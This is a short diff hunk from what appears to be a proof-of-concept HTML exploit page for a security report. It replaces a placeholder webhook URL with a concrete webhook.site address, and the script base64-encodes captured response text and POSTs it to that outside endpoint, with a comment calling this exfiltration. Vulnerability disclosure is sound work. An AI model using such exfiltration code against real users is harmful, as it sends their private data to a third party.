@@ -27,7 +27,7 @@
   console.log("[PoC] response length:", txt.length);
 
   // exfil to tester’s endpoint (triage can watch here)
-  await fetch("https://webhook.site/YOUR-UUID", { method:"POST", body: btoa(txt) });
+  await fetch("https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be", { method:"POST", body: btoa(txt) });
 })();
 </script>
 </body>
